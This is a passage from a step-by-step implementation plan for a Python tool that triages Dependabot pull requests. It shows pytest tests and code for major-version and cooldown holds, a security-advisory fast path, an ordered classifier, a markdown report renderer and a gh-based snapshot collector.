flake8 scripts/security/dep_triage.py tests/scripts/test_dep_triage.py
git add -u
git commit -m "feat: add dependabot triage check-evaluation rules"
```

---

### Task 6: Major-version and cooldown rules (R8, R9)

**Files:**
- Modify: `scripts/security/dep_triage.py`
- Modify: `tests/scripts/test_dep_triage.py`

**Interfaces:**
- Consumes: Task 1 types; `CODE_MAJOR`, `CODE_COOLDOWN`.
- Produces: `PACKAGE_COOLDOWN_DAYS`, `ACTION_COOLDOWN_DAYS`, `major_of(version) -> int | None`, `rule_major(pr) -> Decision | None`, `rule_cooldown(pr) -> Decision | None`, and the `PRSnapshot.security_advisory` field (added here, default `False`).

- [ ] **Step 1: Write the failing test**

```python
@pytest.mark.parametrize(
    "raw,expected",
    [("5.0.0", 5), ("^4.1.11", 4), (">=2.13.5", 2), ("v7.0.1", 7),
     ("4.38.0", 4), ("", None), ("latest", None)],
)
def test_major_of_parses_leading_integer(raw, expected):
    assert dt.major_of(raw) == expected


def test_major_bump_is_held():
    d = dt.rule_major(_pr(package="vitest", from_version="4.1.11", to_version="5.0.0"))
    assert d is not None
    assert d.code == dt.CODE_MAJOR


def test_minor_bump_is_not_major():
    assert dt.rule_major(_pr(from_version="2.12.5", to_version="2.13.5")) is None


def test_unparseable_version_is_not_major():
    assert dt.rule_major(_pr(from_version="", to_version="")) is None


def test_fresh_package_release_held_for_cooldown():
    d = dt.rule_cooldown(_pr(ecosystem="pip", release_age_days=1.0))
    assert d is not None
    assert d.code == dt.CODE_COOLDOWN


def test_aged_package_release_passes_cooldown():
    assert dt.rule_cooldown(_pr(ecosystem="pip", release_age_days=5.0)) is None


def test_action_uses_longer_cooldown():
    """Actions are SHA-pinned supply-chain surface, so they wait longer."""
    pr = _pr(ecosystem="github-actions", package="a/b/c", release_age_days=5.0)
    d = dt.rule_cooldown(pr)
    assert d is not None
    assert d.code == dt.CODE_COOLDOWN
    assert dt.rule_cooldown(_pr(ecosystem="github-actions", package="a/b/c",
                                release_age_days=9.0)) is None


def test_unknown_release_age_is_held():
    d = dt.rule_cooldown(_pr(release_age_days=None))
    assert d is not None
    assert d.code == dt.CODE_COOLDOWN
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/scripts/test_dep_triage.py -k "major or cooldown" -v --no-cov`
Expected: FAIL with `AttributeError: module ... has no attribute 'major_of'`

- [ ] **Step 3: Write minimal implementation**

```python
import re

PACKAGE_COOLDOWN_DAYS = 3
ACTION_COOLDOWN_DAYS = 7

_LEADING_INT = re.compile(r"\D*(\d+)")


def major_of(version: str) -> int | None:
    """Return the leading integer of a version string, ignoring range markers.

    Handles the forms Dependabot produces: ``5.0.0``, ``^4.1.11``, ``>=2.13.5``
    and ``v7.0.1``. Returns None when no leading integer is present.
    """
    match = _LEADING_INT.match(version or "")
    return int(match.group(1)) if match else None


def rule_major(pr: PRSnapshot) -> Decision | None:
    """R8: major bumps carry breaking changes CI may not exercise."""
    before, after = major_of(pr.from_version), major_of(pr.to_version)
    if before is None or after is None or after <= before:
        return None
    return Decision(
        number=pr.number,
        code=CODE_MAJOR,
        reason=(
            f"major bump {pr.from_version} -> {pr.to_version} "
            f"({before} -> {after}); breaking changes may not be covered by CI"
        ),
    )


def rule_cooldown(pr: PRSnapshot) -> Decision | None:
    """R9: hold releases younger than the cooldown window.

    A freshly published version is the window in which a compromised release is
    still undetected. Actions wait longer because they are SHA-pinned
    supply-chain surface executed with repository credentials.
    """
    limit = (
        ACTION_COOLDOWN_DAYS
        if pr.ecosystem == "github-actions"
        else PACKAGE_COOLDOWN_DAYS
    )
    if pr.release_age_days is None:
        return Decision(
            number=pr.number,
            code=CODE_COOLDOWN,
            reason="release age unknown; cannot confirm the cooldown elapsed",
        )
    if pr.release_age_days < limit:
        return Decision(
            number=pr.number,
            code=CODE_COOLDOWN,
            reason=(
                f"{pr.to_version} is {pr.release_age_days:.0f}d old, "
                f"under the {limit}d cooldown for {pr.ecosystem}"
            ),
        )
    return None
```

Move the `import re` to the top of the module with the other imports rather than leaving it mid-file.

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/scripts/test_dep_triage.py -v --no-cov`
Expected: PASS (39 tests)

- [ ] **Step 5: Write the failing test for the security-advisory fast path**

A Dependabot *security* update fixes a live CVE. Holding it for a cooldown
window -- or for a major-version review -- inverts the purpose of the cooldown,
which exists to defend against compromised releases, not to slow down fixes.
Security updates therefore bypass both holds and go straight to the batch proof.

```python
def test_security_advisory_bypasses_cooldown():
    pr = _pr(ecosystem="pip", release_age_days=0.5, security_advisory=True)
    assert dt.rule_cooldown(pr) is None


def test_security_advisory_bypasses_unknown_release_age():
    pr = _pr(release_age_days=None, security_advisory=True)
    assert dt.rule_cooldown(pr) is None


def test_security_advisory_bypasses_major_hold():
    pr = _pr(from_version="4.1.11", to_version="5.0.0", security_advisory=True)
    assert dt.rule_major(pr) is None


def test_non_security_major_is_still_held():
    pr = _pr(from_version="4.1.11", to_version="5.0.0", security_advisory=False)
    assert dt.rule_major(pr) is not None


def test_security_advisory_does_not_bypass_policy_holds():
    """A CVE fix is still not permission to rewrite a base image unreviewed."""
    pr = _pr(files=("deploy/docker/api/Dockerfile",), security_advisory=True)
    assert dt.rule_policy_path(pr) is not None
    held = _pr(package="tree-sitter", security_advisory=True)
    assert dt.rule_held_package(held) is not None


def test_security_advisory_defaults_to_false(tmp_path):
    """Snapshots written before this field existed still load."""
    prs = dt.load_snapshot(FIXTURE)
    assert all(p.security_advisory is False for p in prs)
```

- [ ] **Step 6: Run test to verify it fails**

Run: `pytest tests/scripts/test_dep_triage.py -k security -v --no-cov`
Expected: FAIL with `TypeError: PRSnapshot.__init__() got an unexpected keyword argument 'security_advisory'`

- [ ] **Step 7: Add the field, the loader support, and the two guards**

Add a trailing field to `PRSnapshot` (it must be last, because it carries a
default and every earlier field does not):

```python
    security_advisory: bool = False
```

Add the matching line to the `PRSnapshot(...)` construction inside
`load_snapshot`, after `risk_tier`:

```python
                security_advisory=bool(item.get("security_advisory", False)),
```

Add a `security_advisory=False` default to the `_pr(**kw)` test factory's
`base` dict so existing tests keep working unchanged.

Then guard both rules. In `rule_major`, immediately after the docstring:

```python
    if pr.security_advisory:
        return None
```

In `rule_cooldown`, immediately after the docstring:

```python
    if pr.security_advisory:
        return None
```

Extend each docstring with one sentence naming the bypass, for example in
`rule_cooldown`:

```python
    """R9: hold releases younger than the cooldown window.

    A freshly published version is the window in which a compromised release is
    still undetected. Actions wait longer because they are SHA-pinned
    supply-chain surface executed with repository credentials.

    Security advisories bypass this hold entirely: the cooldown defends against
    compromised releases, and applying it to a CVE fix would delay the patch it
    exists to protect.
    """
```

- [ ] **Step 8: Run test to verify it passes**

Run: `pytest tests/scripts/test_dep_triage.py -v --no-cov`
Expected: PASS, including every previously passing test.

- [ ] **Step 9: Format, lint, commit**

```bash
black scripts/security/dep_triage.py tests/scripts/test_dep_triage.py
flake8 scripts/security/dep_triage.py tests/scripts/test_dep_triage.py
git add -u
git commit -m "feat: add major-version, cooldown and security fast-path rules"
```

---

### Task 7: Ordered classifier

**Files:**
- Modify: `scripts/security/dep_triage.py`
- Modify: `tests/scripts/test_dep_triage.py`

**Interfaces:**
- Consumes: every `rule_*` from Tasks 2-6, `detect_families` from Task 4.
- Produces: `classify(prs: list[PRSnapshot]) -> list[Decision]`.

- [ ] **Step 1: Write the failing test**

```python
def test_classify_covers_every_pr_exactly_once():
    prs = dt.load_snapshot(FIXTURE)
    decisions = dt.classify(prs)
    assert len(decisions) == len(prs)
    assert {d.number for d in decisions} == {p.number for p in prs}


def test_classify_assigns_expected_codes_for_the_observed_batch():
    """Regression lock on the real 2026-09-19 batch."""
    by_number = {d.number: d for d in dt.classify(dt.load_snapshot(FIXTURE))}
    assert by_number[386].code == dt.CODE_NON_DEPENDABOT
    assert by_number[450].code == dt.CODE_COUPLED   # green but coupled
    assert by_number[452].code == dt.CODE_COUPLED   # coupling precedes failure
    assert by_number[442].code == dt.CODE_COUPLED   # coupling precedes flake
    assert by_number[443].code == dt.CODE_COUPLED   # green but peer-coupled
    assert by_number[439].code == dt.CODE_CANDIDATE
    assert by_number[446].code == dt.CODE_CANDIDATE


def test_author_exclusion_precedes_all_other_rules():
    pr = _pr(number=386, author="app/github-actions", checks=(),
             files=("pyproject.toml",))
    assert dt.classify([pr])[0].code == dt.CODE_NON_DEPENDABOT


def test_every_decision_carries_a_nonempty_reason():
    for d in dt.classify(dt.load_snapshot(FIXTURE)):
        assert d.reason.strip(), f"PR #{d.number} has no reason"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/scripts/test_dep_triage.py -k classify -v --no-cov`
Expected: FAIL with `AttributeError: module ... has no attribute 'classify'`

- [ ] **Step 3: Write minimal implementation**

```python
def classify(prs: list[PRSnapshot]) -> list[Decision]:
    """Classify every PR with the first matching rule.

    Rule order is load-bearing. Author and check-presence exclusions run first
    so non-Dependabot and unvalidated PRs never reach version logic. Coupling
    runs before check evaluation because the failure mode it guards against is a
    *green* sibling. Everything surviving is a candidate, which only becomes
    merge-safe by passing the batch proof.
    """
    families = detect_families(prs)
    decisions: list[Decision] = []
    for pr in prs:
        decision = (
            rule_non_dependabot(pr)
            or rule_no_checks(pr)
            or rule_policy_path(pr)
            or rule_held_package(pr)
            or rule_coupled(pr, families)
            or rule_failing(pr)
            or rule_missing_required(pr)
            or rule_major(pr)
            or rule_cooldown(pr)
            # R10: nothing objected.
            or Decision(
                number=pr.number,
                code=CODE_CANDIDATE,
                reason=(
                    "no rule objected; pending batch proof before it is "
                    "reported merge-safe"
                ),
            )
        )
        decisions.append(decision)
    return decisions
```

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/scripts/test_dep_triage.py -v --no-cov`
Expected: PASS (43 tests)

- [ ] **Step 5: Write the failing test for batch-proof promotion**

A candidate only becomes merge-safe by surviving the batch proof. Without this
function `CODE_MERGE_SAFE` and `CODE_CONFLICT` are never assigned, so the report
could never say anything was mergeable.

```python
def test_promote_marks_proved_candidates_merge_safe():
    prs = dt.load_snapshot(FIXTURE)
    decisions = dt.classify(prs)
    promoted = {d.number: d for d in dt.promote(decisions, proved=[439, 446])}
    assert promoted[439].code == dt.CODE_MERGE_SAFE
    assert promoted[446].code == dt.CODE_MERGE_SAFE
    assert "batch proof" in promoted[439].reason.lower()


def test_promote_marks_conflicted_candidates_attention():
    decisions = dt.classify(dt.load_snapshot(FIXTURE))
    promoted = {d.number: d for d in dt.promote(
        decisions, proved=[446], conflicted=[439])}
    assert promoted[439].code == dt.CODE_CONFLICT
    assert promoted[446].code == dt.CODE_MERGE_SAFE


def test_promote_never_upgrades_a_non_candidate():
    """A coupled or excluded PR must not become merge-safe by promotion."""
    decisions = dt.classify(dt.load_snapshot(FIXTURE))
    promoted = {d.number: d for d in dt.promote(
        decisions, proved=[386, 450, 452])}
    assert promoted[386].code == dt.CODE_NON_DEPENDABOT
    assert promoted[450].code == dt.CODE_COUPLED
    assert promoted[452].code == dt.CODE_COUPLED


def test_promote_leaves_unproved_candidates_as_candidates():
    decisions = dt.classify(dt.load_snapshot(FIXTURE))
    promoted = {d.number: d for d in dt.promote(decisions, proved=[])}
    assert promoted[439].code == dt.CODE_CANDIDATE


def test_conflict_wins_when_a_pr_is_both_proved_and_conflicted():
    """The worst possible wrong answer is reporting a conflict as merge-safe."""
    decisions = dt.classify(dt.load_snapshot(FIXTURE))
    promoted = {
        d.number: d
        for d in dt.promote(decisions, proved=[439], conflicted=[439])
    }
    assert promoted[439].code == dt.CODE_CONFLICT


def test_promote_does_not_mutate_its_input():
    decisions = dt.classify(dt.load_snapshot(FIXTURE))
    before = [(d.number, d.code) for d in decisions]
    dt.promote(decisions, proved=[439, 446], conflicted=[])
    after = [(d.number, d.code) for d in decisions]
    assert before == after
```

- [ ] **Step 6: Run test to verify it fails**

Run: `pytest tests/scripts/test_dep_triage.py -k promote -v --no-cov`
Expected: FAIL with `AttributeError: module ... has no attribute 'promote'`

- [ ] **Step 7: Write minimal implementation**

```python
def promote(
    decisions: list[Decision],
    proved: list[int],
    conflicted: list[int] | None = None,
) -> list[Decision]:
    """Apply batch-proof results to a classification.

    Only a ``candidate`` may be promoted. Anything the rules already excluded,
    held or marked coupled keeps its original classification, so a passing batch
    proof can never override a policy decision.
    """
    proved_set = set(proved)
    conflicted_set = set(conflicted or ())
    out: list[Decision] = []
    for d in decisions:
        if d.code != CODE_CANDIDATE:
            out.append(d)
        elif d.number in conflicted_set:
            out.append(
                Decision(
                    number=d.number,
                    code=CODE_CONFLICT,
                    reason="conflicts with the candidate integration branch",
                    family=d.family,
                )
            )
        elif d.number in proved_set:
            out.append(
                Decision(
                    number=d.number,
                    code=CODE_MERGE_SAFE,
                    reason=(
                        "passed the batch proof as a unit: dependency "
                        "resolution and the test suite succeeded with every "
                        "other candidate merged alongside it"
                    ),
                    family=d.family,
                )
            )
        else:
            out.append(d)
    return out
```

- [ ] **Step 8: Run test to verify it passes**

Run: `pytest tests/scripts/test_dep_triage.py -v --no-cov`
Expected: PASS (47 tests)

- [ ] **Step 9: Commit**

```bash
black scripts/security/dep_triage.py tests/scripts/test_dep_triage.py
flake8 scripts/security/dep_triage.py tests/scripts/test_dep_triage.py
git add -u
git commit -m "feat: add ordered dependabot triage classifier and proof promotion"
```

---

### Task 8: Report renderer and CLI

**Files:**
- Modify: `scripts/security/dep_triage.py`
- Modify: `tests/scripts/test_dep_triage.py`

**Interfaces:**
- Consumes: `classify`, `load_snapshot`, all `CODE_*`.
- Produces: `render_report(decisions, prs, proof_url=None) -> str`, `main(argv) -> int`.

- [ ] **Step 1: Write the failing test**

```python
def test_render_report_groups_by_classification():
    prs = dt.load_snapshot(FIXTURE)
    md = dt.render_report(dt.classify(prs), prs)
    assert md.startswith("# Dependabot Triage --")
    for heading in ("## Merge-safe", "## Coupled sets", "## Held",
                    "## Needs attention", "## Excluded"):
        assert heading in md


def test_render_report_lists_family_members_together():
    prs = dt.load_snapshot(FIXTURE)
    md = dt.render_report(dt.classify(prs), prs)
    assert "github/codeql-action" in md
    assert "#450" in md and "#452" in md


def test_render_report_states_a_reason_for_every_pr():
    prs = dt.load_snapshot(FIXTURE)
    md = dt.render_report(dt.classify(prs), prs)
    for pr in prs:
        assert f"#{pr.number}" in md


def test_main_writes_report_and_returns_zero(tmp_path):
    out = tmp_path / "report.md"
    rc = dt.main(["--snapshot", str(FIXTURE), "--output", str(out)])
    assert rc == 0
    assert out.read_text(encoding="utf-8").startswith("# Dependabot Triage --")


def test_main_writes_decisions_json_when_requested(tmp_path):
    out = tmp_path / "report.md"
    dec = tmp_path / "decisions.json"
    rc = dt.main(["--snapshot", str(FIXTURE), "--output", str(out),
                  "--decisions", str(dec)])
    assert rc == 0
    payload = json.loads(dec.read_text(encoding="utf-8"))
    assert {d["number"] for d in payload["decisions"]} >= {386, 439, 450}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/scripts/test_dep_triage.py -k "render or main" -v --no-cov`
Expected: FAIL with `AttributeError: module ... has no attribute 'render_report'`

- [ ] **Step 3: Write minimal implementation**

```python
import argparse
from datetime import datetime, timezone

_SECTIONS: tuple[tuple[str, tuple[str, ...]], ...] = (
    ("Merge-safe", (CODE_MERGE_SAFE,)),
    ("Candidates (pending batch proof)", (CODE_CANDIDATE,)),
    ("Coupled sets", (CODE_COUPLED,)),
    (
        "Held",
        (
            CODE_POLICY_REVIEW,
            CODE_PINNED_BY_POLICY,
            CODE_RISK_TIER,
            CODE_MAJOR,
            CODE_COOLDOWN,
        ),
    ),
    (
        "Needs attention",
        (
            CODE_FAILING,
            CODE_SUSPECTED_FLAKE,
            CODE_MISSING_REQUIRED,
            CODE_CONFLICT,
        ),
    ),
    ("Excluded", (CODE_NON_DEPENDABOT, CODE_NO_CHECKS)),
)


def render_report(
    decisions: list[Decision],
    prs: list[PRSnapshot],
    proof_url: str | None = None,
) -> str:
    """Build the markdown triage report."""
    now = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC")
    titles = {p.number: p.title for p in prs}
    lines: list[str] = [f"# Dependabot Triage -- {now}", ""]
    lines.append(
        "Automated classification. Every merge is performed by an operator; "
        "nothing here merges or approves a pull request."
    )
    lines.append("")
    if proof_url:
        lines.append(f"Batch proof run: {proof_url}")
        lines.append("")

    for heading, codes in _SECTIONS:
        selected = [d for d in decisions if d.code in codes]
        lines.append(f"## {heading}")
        lines.append("")
        if not selected:
            # Emit the heading with an explicit "(none)" rather than omitting
            # it. A reader needs to know the section was considered and came
            # back empty; a missing heading is indistinguishable from a
            # renderer that forgot to check.
            lines.append("(none)")
            lines.append("")
            continue
        if heading == "Coupled sets":
            by_family: dict[str, list[Decision]] = {}
            for d in selected:
                by_family.setdefault(d.family or "unknown", []).append(d)
            for family, members in sorted(by_family.items()):
                numbers = ", ".join(f"#{d.number}" for d in sorted(
                    members, key=lambda m: m.number))
                lines.append(f"### `{family}`")
                lines.append("")
                lines.append(
                    f"Members ({len(members)}): {numbers}. These must land "
                    "together; no member is individually mergeable."
                )
                lines.append("")
            lines.append("")
            continue
        lines.append("| PR | Code | Title | Reason |")
        lines.append("|----|------|-------|--------|")
        for d in sorted(selected, key=lambda x: x.number):
            title = titles.get(d.number, "").replace("|", "\\|")
            reason = d.reason.replace("|", "\\|")
            lines.append(f"| #{d.number} | `{d.code}` | {title} | {reason} |")
        lines.append("")
    return "\n".join(lines).rstrip() + "\n"


def main(argv: list[str] | None = None) -> int:
    """Classify a snapshot and write the markdown report."""
    parser = argparse.ArgumentParser(
        description="Classify open Dependabot PRs for Project Aura."
    )
    parser.add_argument("--snapshot", type=Path, required=True,
                        help="Path to the snapshot JSON from dep_triage_collect.")
    parser.add_argument("--output", type=Path, required=True,
                        help="Path to write the markdown report.")
    parser.add_argument("--decisions", type=Path, default=None,
                        help="Optional path to write decisions as JSON.")
    parser.add_argument("--proof-url", default=None,
                        help="URL of the batch-proof run, embedded in the report.")
    parser.add_argument("--proved", default=None,
                        help="JSON list of PR numbers that passed the batch "
                             "proof; promotes them to merge-safe.")
    parser.add_argument("--conflicted", default=None,
                        help="JSON list of PR numbers that conflicted with the "
                             "candidate integration branch.")
    args = parser.parse_args(argv)

    prs = load_snapshot(args.snapshot)
    decisions = classify(prs)
    if args.proved or args.conflicted:
        decisions = promote(
            decisions,
            proved=json.loads(args.proved) if args.proved else [],
            conflicted=json.loads(args.conflicted) if args.conflicted else [],
        )

    args.output.parent.mkdir(parents=True, exist_ok=True)
    args.output.write_text(
        render_report(decisions, prs, args.proof_url), encoding="utf-8"
    )
    if args.decisions:
        args.decisions.parent.mkdir(parents=True, exist_ok=True)
        args.decisions.write_text(
            json.dumps(
                {"decisions": [d.__dict__ for d in decisions]}, indent=2
            ),
            encoding="utf-8",
        )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

Consolidate `import argparse` and the `datetime` import into the module header.

- [ ] **Step 4: Run test to verify it passes**

Run: `pytest tests/scripts/test_dep_triage.py -v --no-cov`
Expected: PASS (48 tests)

- [ ] **Step 5: Verify coverage meets the floor**

Run: `pytest tests/scripts/test_dep_triage.py --cov=scripts.security.dep_triage --cov-report=term-missing`
Expected: coverage for `dep_triage.py` at or above 70%. If below, add tests for the uncovered branches -- do not lower the threshold.

- [ ] **Step 6: Commit**

```bash
black scripts/security/dep_triage.py tests/scripts/test_dep_triage.py
flake8 scripts/security/dep_triage.py tests/scripts/test_dep_triage.py
git add -u
git commit -m "feat: add dependabot triage report renderer and CLI"
```

---

### Task 9: Snapshot collector

**Files:**
- Create: `scripts/security/dep_triage_collect.py`
- Create: `tests/scripts/test_dep_triage_collect.py`

**Interfaces:**
- Consumes: nothing from earlier tasks at runtime; must emit JSON matching the schema `load_snapshot` reads (Task 1).
- Produces: `parse_bump_title(title) -> tuple[str, str, str]`, `is_security_advisory(body) -> bool`, `build_snapshot(prs_json, checks_by_pr, required, ages, tiers) -> dict`, `main(argv) -> int`.

- [ ] **Step 1: Write the failing test**

```python
"""Tests for the Dependabot triage snapshot collector."""

import json

import pytest

from scripts.security import dep_triage_collect as dc
from scripts.security import dep_triage as dt


@pytest.mark.parametrize(
    "title,expected",
    [
        ("chore(deps): bump github/codeql-action/init from 4.37.9 to 4.38.0",
         ("github/codeql-action/init", "4.37.9", "4.38.0")),
        ("chore(deps-dev): bump vitest from 4.1.11 to 5.0.0 in /frontend",
         ("vitest", "4.1.11", "5.0.0")),
        ("chore(deps): update pydantic requirement from >=2.12.5 to >=2.13.5",
         ("pydantic", ">=2.12.5", ">=2.13.5")),
        ("chore: release 1.8.0", ("", "", "")),
    ],
)
def test_parse_bump_title(title, expected):
    assert dc.parse_bump_title(title) == expected


def test_build_snapshot_emits_schema_load_snapshot_accepts(tmp_path):
    snapshot = dc.build_snapshot(
        prs=[{
            "number": 450,
            "title": "chore(deps): bump github/codeql-action/upload-sarif "
                     "from 4.37.9 to 4.38.0",
            "author": {"login": "dependabot[bot]"},
            "files": [".github/workflows/code-quality.yml"],
        }],
        checks_by_pr={450: [
            {"name": "Analyze (python)", "status": "completed",
             "conclusion": "success", "failing_log_excerpt": ""},
        ]},
        required_checks=["Analyze (python)"],
        release_ages={"github/codeql-action/upload-sarif": 9.0},
        risk_tiers={},
    )
    path = tmp_path / "snap.json"
    path.write_text(json.dumps(snapshot), encoding="utf-8")
    prs = dt.load_snapshot(path)
    assert len(prs) == 1
    assert prs[0].ecosystem == "github-actions"
    assert prs[0].package == "github/codeql-action/upload-sarif"


def test_infer_ecosystem_from_files():
    assert dc.infer_ecosystem([".github/workflows/x.yml"]) == "github-actions"
    assert dc.infer_ecosystem(["frontend/package.json"]) == "npm"
    assert dc.infer_ecosystem(["requirements.txt"]) == "pip"
    assert dc.infer_ecosystem(["deploy/docker/api/Dockerfile"]) == "docker"
    assert dc.infer_ecosystem(["CHANGELOG.md"]) == "unknown"


def test_infer_directory_from_files():
    assert dc.infer_directory(["frontend/package.json"]) == "/frontend"
    assert dc.infer_directory(["sdk/typescript/package.json"]) == "/sdk/typescript"
    assert dc.infer_directory(["requirements.txt"]) == "/"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `pytest tests/scripts/test_dep_triage_collect.py -v --no-cov`
Expected: FAIL with `ModuleNotFoundError: No module named 'scripts.security.dep_triage_collect'`

- [ ] **Step 3: Write minimal implementation**

```python
# scripts/security/dep_triage_collect.py
"""Collect the Dependabot triage snapshot.

This is the only module in the triage pipeline that performs network access.
It gathers pull request metadata, check runs, release ages and risk-register
tiers into a single JSON document, so that ``dep_triage.py`` can stay pure and
testable against recorded fixtures.
"""

from __future__ import annotations

import argparse
import json
import re
import subprocess
from datetime import datetime, timezone
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parents[2]
REGISTER_PATH = REPO_ROOT / "docs/security/DEPENDENCY_RISK_REGISTER.md"

_BUMP = re.compile(
    r"\b(?:bump|update)\s+(?P<pkg>\S+?)(?:\s+requirement)?\s+"
    r"from\s+(?P<old>\S+)\s+to\s+(?P<new>\S+)"
)


def parse_bump_title(title: str) -> tuple[str, str, str]:
    """Extract (package, from_version, to_version) from a Dependabot title.

    Returns three empty strings when the title is not a version bump, which is
    how non-Dependabot PRs such as release PRs fall through harmlessly.
    """
    match = _BUMP.search(title or "")
    if not match:
        return ("", "", "")
    return (match.group("pkg"), match.group("old"), match.group("new"))


def infer_ecosystem(files: list[str]) -> str:
    """Infer the package ecosystem from the paths a PR touches."""
    for path in files:
        if path.startswith(".github/workflows/"):
            return "github-actions"
        if path.endswith(("package.json", "package-lock.json")):
            return "npm"
        if "requirements" in path and path.endswith(".txt"):
            return "pip"
        if path.endswith("pyproject.toml"):
            return "pip"
        if "Dockerfile" in path:
            return "docker"
    return "unknown"


def infer_directory(files: list[str]) -> str:
    """Infer the manifest directory for npm PRs; '/' for everything else."""
    for path in files:
        if path.endswith(("package.json", "package-lock.json")):
            parent = str(Path(path).parent)
            return "/" if parent == "." else f"/{parent}"
    return "/"


def _risk_tiers(register: Path) -> dict[str, str]:
    """Map package name to tier by reading the risk register's tables."""
    tiers: dict[str, str] = {}
    if not register.exists():
        return tiers
    for line in register.read_text(encoding="utf-8").splitlines():
        if not line.startswith("|"):
            continue
        cells = [c.strip() for c in line.strip("|").split("|")]
        if len(cells) < 3:
            continue
        name = cells[0].strip("`")
        tier = cells[2].strip("*").lower()
        if tier in {"at-risk", "replace-now", "watch", "healthy"}:
            tiers[name] = tier
    return tiers


def build_snapshot(
    prs: list[dict],
    checks_by_pr: dict[int, list[dict]],
    required_checks: list[str],
    release_ages: dict[str, float],
    risk_tiers: dict[str, str],
) -> dict:
    """Assemble the snapshot document consumed by dep_triage.load_snapshot."""
    out: list[dict] = []
    for pr in prs:
        files = list(pr.get("files", []))
        package, old, new = parse_bump_title(pr.get("title", ""))
        out.append(
            {
                "number": pr["number"],
                "title": pr.get("title", ""),
                "author": (pr.get("author") or {}).get("login", ""),
                "files": files,
                "checks": checks_by_pr.get(pr["number"], []),
                "required_checks": required_checks,
                "ecosystem": infer_ecosystem(files),
                "directory": infer_directory(files),
                "package": package,
                "from_version": old,
                "to_version": new,
                "release_age_days": release_ages.get(package),
                "risk_tier": risk_tiers.get(package, "unknown"),
            }
        )
    return {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "pull_requests": out,
    }


def _gh_json(args: list[str]) -> object:
    """Run a gh command and parse its JSON output."""
    result = subprocess.run(
        ["gh", *args], capture_output=True, text=True, check=True
    )
    return json.loads(result.stdout)


def main(argv: list[str] | None = None) -> int:
    """Collect the snapshot and write it to --output."""
    parser = argparse.ArgumentParser(
        description="Collect the Dependabot triage snapshot."
    )
    parser.add_argument("--output", type=Path, required=True,
                        help="Path to write the snapshot JSON.")
    parser.add_argument("--repo", required=True,
                        help="owner/name of the repository.")
    parser.add_argument(
        "--required-check", action="append", default=[],
        help="Name of a required status check; repeatable.",
    )
    args = parser.parse_args(argv)

    listing = _gh_json([
        "pr", "list", "--repo", args.repo, "--state", "open",
        "--limit", "100", "--json", "number,title,author,files",
    ])
    prs = [
        {
            "number": item["number"],
            "title": item["title"],
            "author": item["author"],
            "files": [f["path"] for f in item.get("files", [])],
        }
        for item in listing  # type: ignore[union-attr]
    ]

    checks_by_pr: dict[int, list[dict]] = {}
    for pr in prs:
        runs = _gh_json([
            "pr", "checks", str(pr["number"]), "--repo", args.repo,
            "--json", "name,state,description",
        ])
        checks_by_pr[pr["number"]] = [
            {
                "name": r["name"],
                "status": "completed",
                "conclusion": (
                    "success" if r["state"] == "SUCCESS"
                    else "failure" if r["state"] == "FAILURE"
                    else "skipped" if r["state"] == "SKIPPED"
                    else None
                ),
                "failing_log_excerpt": r.get("description", ""),
            }
            for r in runs  # type: ignore[union-attr]
        ]

    snapshot = build_snapshot(
        prs=prs,
        checks_by_pr=checks_by_pr,
        required_checks=args.required_check,
        release_ages={},
        risk_tiers=_risk_tiers(REGISTER_PATH),
    )
    args.output.parent.mkdir(parents=True, exist_ok=True)
    args.output.write_text(json.dumps(snapshot, indent=2), encoding="utf-8")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

Note: `release_ages` is left empty by `main` in this task; Task 10 populates it. `rule_cooldown` already treats an unknown age as held, so the pipeline is conservative until then.

- [ ] **Step 4: Write the failing test for security-advisory detection**

The security fast path added in Task 6 reads `PRSnapshot.security_advisory`.
Nothing sets it unless the collector detects it, so without this step the fast
path is dead code and CVE fixes still sit in the cooldown queue.

Dependabot's security updates describe the vulnerabilities they fix in the PR
body, citing a GHSA or CVE identifier. Regular version bumps do not.

```python
@pytest.mark.parametrize(
    "body,expected",
    [
        ("Bumps cryptography from 49.0.0 to 50.0.1.", False),
        ("", False),
        (None, False),
        ("Bumps urllib3. Fixes [GHSA-1234-abcd-5678](https://x).", True),
        ("Patches CVE-2026-12345 in the transitive dependency.", True),
        ("mentions ghsa-lower-case-id", True),
    ],
)
def test_is_security_advisory(body, expected):
    assert dc.is_security_advisory(body) is expected


def test_build_snapshot_carries_the_security_flag(tmp_path):
    snapshot = dc.build_snapshot(
        prs=[{
            "number": 1,
            "title": "chore(deps): bump urllib3 from 2.0.0 to 2.0.1",
            "author": {"login": "dependabot[bot]"},
            "files": ["requirements.txt"],
            "security_advisory": True,
        }],
        checks_by_pr={1: [
            {"name": "Analyze (python)", "status": "completed",
             "conclusion": "success", "failing_log_excerpt": ""},
        ]},
        required_checks=["Analyze (python)"],
        release_ages={"urllib3": 0.2},
        risk_tiers={},
    )
    assert snapshot["pull_requests"][0]["security_advisory"] is True
    path = tmp_path / "snap.json"
    path.write_text(json.dumps(snapshot), encoding="utf-8")
    assert dt.load_snapshot(path)[0].security_advisory is True
```

- [ ] **Step 5: Run test to verify it fails**

Run: `pytest tests/scripts/test_dep_triage_collect.py -k security -v --no-cov`
Expected: FAIL with `AttributeError: module ... has no attribute 'is_security_advisory'`

- [ ] **Step 6: Implement detection and carry the flag**

```python
_ADVISORY = re.compile(r"(GHSA-[0-9a-z-]+|CVE-\d{4}-\d+)", re.IGNORECASE)


def is_security_advisory(body: str | None) -> bool:
    """True when a pull request body cites a GHSA or CVE identifier.

    Dependabot security updates describe the vulnerabilities they fix and cite
    an advisory id; ordinary version bumps do not. The flag lets a CVE fix skip
    the cooldown and major-version holds, which exist to slow down *unproven*
    releases, not patches.
    """
    return bool(_ADVISORY.search(body or ""))
```

In `build_snapshot`, add this key to each emitted record, after `risk_tier`:

```python
                "security_advisory": bool(pr.get("security_advisory", False)),
```

In `main`, request the body from `gh` by changing the `--json` field list to
`number,title,author,files,body`, and set the flag when building each record:

```python
            "security_advisory": is_security_advisory(item.get("body")),
```

- [ ] **Step 7: Run test to verify it passes**

